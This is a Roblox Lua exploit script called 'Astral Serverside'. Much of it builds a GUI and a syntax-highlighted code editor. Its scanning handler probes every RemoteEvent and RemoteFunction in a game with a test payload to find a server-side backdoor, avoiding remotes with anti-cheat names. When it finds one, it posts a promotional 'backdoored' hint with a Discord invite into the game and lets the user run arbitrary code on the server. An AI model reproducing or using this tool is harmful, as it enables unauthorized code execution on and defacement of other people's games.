AST["39"]["Visible"] = false;
AST["39"]["ZIndex"] = 2;
AST["39"]["BorderSizePixel"] = 0;
AST["39"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
AST["39"]["Size"] = UDim2.new(1, -17, 0, 17);
AST["39"]["Position"] = UDim2.new(0, 0, 1, -17);
AST["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["39"]["Name"] = [[X_Bar]];
AST["39"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border
AST["3a"] = Instance.new("UIStroke", AST["f"]);
AST["3a"]["Name"] = [[Border]];
AST["3a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow
AST["3b"] = Instance.new("UIGradient", AST["3a"]);
AST["3b"]["Name"] = [[Rainbow]];
AST["3b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
AST["3c"] = Instance.new("LocalScript", AST["3b"]);
AST["3c"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Corner
AST["3d"] = Instance.new("UICorner", AST["f"]);
AST["3d"]["Name"] = [[Corner]];
AST["3d"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Title
AST["3e"] = Instance.new("TextLabel", AST["d"]);
AST["3e"]["TextWrapped"] = true;
AST["3e"]["TextStrokeTransparency"] = 0;
AST["3e"]["BorderSizePixel"] = 0;
AST["3e"]["TextSize"] = 14;
AST["3e"]["TextScaled"] = true;
AST["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["3e"]["BackgroundTransparency"] = 1;
AST["3e"]["Size"] = UDim2.new(1, 0, 0, 32);
AST["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["3e"]["Text"] = [[Astral Serverside]];
AST["3e"]["Name"] = [[Title]];
AST["3e"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute
AST["3f"] = Instance.new("TextButton", AST["d"]);
AST["3f"]["TextStrokeTransparency"] = 0;
AST["3f"]["BorderSizePixel"] = 0;
AST["3f"]["TextSize"] = 24;
AST["3f"]["AutoButtonColor"] = false;
AST["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["3f"]["AnchorPoint"] = Vector2.new(0.5, 0);
AST["3f"]["BackgroundTransparency"] = 1;
AST["3f"]["Size"] = UDim2.new(1, -50, 0, 30);
AST["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["3f"]["Text"] = [[Execute]];
AST["3f"]["Name"] = [[Execute]];
AST["3f"]["Position"] = UDim2.new(0.5, 0, 0, 235);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border
AST["40"] = Instance.new("UIStroke", AST["3f"]);
AST["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
AST["40"]["Name"] = [[Border]];
AST["40"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow
AST["41"] = Instance.new("UIGradient", AST["40"]);
AST["41"]["Name"] = [[Rainbow]];
AST["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
AST["42"] = Instance.new("LocalScript", AST["41"]);
AST["42"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Corner
AST["43"] = Instance.new("UICorner", AST["3f"]);
AST["43"]["Name"] = [[Corner]];
AST["43"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
local function C_6()
local script = AST["6"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_6);
-- StarterGui.Astral Serverside.MainFrame.Drag
local function C_7()
local script = AST["7"];
	local dragging, dragstart, startpos
	script.Parent.InputBegan:Connect(function(input)
		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
			dragging, dragstart, startpos = true, input.Position, script.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
			local delta = input.Position - dragstart
			script.Parent.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_7);
-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
local function C_c()
local script = AST["c"];
	--= Info =--
	local mainframe = script.Parent
	local scanningframe = mainframe:WaitForChild("ScanningFrame",3)
	local executionframe = mainframe:WaitForChild("ExecutionFrame",3)
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local vulnremote: RemoteEvent | RemoteFunction = nil
	local backdoored: boolean = false
	local credithint: boolean = true -- Just to give me credit for making Astral :3
	
	--= Setup =--
	scanningframe.Visible = true
	scanningframe.Position = UDim2.new(0,0,0,0)
	executionframe.Visible = false
	executionframe.Position = UDim2.new(-1,0,0,0)
	
	--= Functions =--
	local function notify(desc, duration)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Astral Serverside",
				Text = tostring(desc),
				Duration = duration or 3
			})
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://17582299860"
			sound.Volume = 1
			sound.PlayOnRemove = true
			sound:Destroy()
		end)
	end
	
	local function fire(rem,code)
		if not rem then return end
		pcall(function()
			if rem:IsA("RemoteEvent") then
				rem:FireServer(code)
			elseif rem:IsA("RemoteFunction") then
				rem:InvokeServer(code)
			end
		end)
	end
	
	local function checkremote(remote: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
			return true
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return true
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--= Pre-scanning Variables =--
	local testpartname: string = "starlightreborn_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	--= Scanning =--
	local timer: number = 0
	coroutine.wrap(function()
		repeat
			timer += 0.001
			task.wait(0.001)
		until backdoored
	end)()
	
	local function checkpayload(remote: RemoteEvent | RemoteFunction)
		fire(remote,payload)
		for i = 1,320 do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.001)
		end
		return false
	end
	
	for _, remote: RemoteEvent | RemoteFunction in ipairs(game:GetDescendants()) do
		if remote.Parent == nil then return end
	
		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
			if checkremote(remote) then
				continue
			else
				print("Testing: "..remote.Name)
				if checkpayload(remote) then
					backdoored = true
					vulnremote = remote
					fire(vulnremote,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
					break
				end
			end
		end
	end
	
	if backdoored and vulnremote then
		if credithint then fire(vulnremote,[[Instance.new("Hint",workspace).Text="This game was backdoored with: Astral SS  |  Join StrawberryCMD .gg/bXQfb3QWa8"]]) end
		notify("Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
		scanningframe:FindFirstChild("Description").Text = "Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer).."\nLoading execution panel..."
		coroutine.wrap(function()
			task.wait(1)
			executionframe.Visible = true
			scanningframe:TweenPosition(UDim2.new(1,0,0,0),"In","Back",1,false)
			executionframe:TweenPosition(UDim2.new(0,0,0,0),"In","Back",1,false)
			wait(1)
			scanningframe.Visible = false
		end)()
	else
		notify("No backdoors found! \n Exiting script safely...")
		scanningframe:FindFirstChild("Description").Text = "No backdoors found! \n Exiting script safely..."
		task.wait(0.5)
		mainframe.Parent:Destroy()
		return
	end
	
	--= Button Function(s) =--
	executionframe.Execute.MouseButton1Click:Connect(function()
		if not backdoored then return end
		local code = executionframe.FastColoredTextbox.Scroll.TextBox.Text
		fire(vulnremote,code)
	end)
end;
task.spawn(C_c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
local function C_1a()
local script = AST["1a"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_1a);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
local function C_3c()
local script = AST["3c"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_3c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
local function C_42()
local script = AST["42"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_42);

return AST["1"], require;
